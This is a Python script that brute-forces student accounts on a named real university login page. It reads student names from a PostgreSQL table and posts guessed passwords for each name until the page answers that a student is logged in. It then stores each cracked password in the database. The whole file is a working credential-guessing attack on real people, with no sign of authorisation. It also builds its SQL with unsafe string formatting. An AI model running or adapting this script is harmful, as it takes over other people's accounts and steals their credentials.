import psycopg2
import requests
from passwords import prob_passwords

url = 'http://old.sibupk.su/services/std/login.php'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}
conn = psycopg2.connect(
    dbname="",
    user="",
    password="",
    host="",
    port=""
)
cur = conn.cursor()
cur.execute("SELECT DISTINCT full_name FROM student OFFSET (SELECT COUNT(DISTINCT full_name)*2/3 FROM student) LIMIT "
            "(SELECT COUNT(DISTINCT full_name)/3 FROM student)")
rows = cur.fetchall()
for row in rows:
    full_name = row[0]
    print(f"Updating password for {full_name}")
    a = True

    # Try all passwords for the current code
    for password in prob_passwords:
        while a is True:
            data = {
                'user': full_name.encode('windows-1251'),
                'pass': password.encode('windows-1251'),
                'login': 'Войти'
            }
            response = requests.post(url, headers=headers, data=data)
            response.encoding = 'windows-1251'
            print(response.status_code)
            if response.status_code == 403:
                print(f"Password retry {password}")
                continue
            elif response.status_code == 502:
                print(f"Password retry {password}")
                continue
            elif response.status_code == 504:
                print(f"Password retry {password}")
                continue
            elif response.text == 'Пароль неправильный!':
                print(f"Password incorrect {password}")
                break
            elif "Вы вошли как студент" in response.text:
                print(f"Correct password is {password}")
                cur.execute(f"UPDATE student SET password = '{password}' WHERE full_name = '{full_name}'")
                conn.commit()
                a = False
            else:
                print(f"Some error in {password} retry ")
                continue
    print(f"Password updated for {full_name}")
cur.close()
conn.close()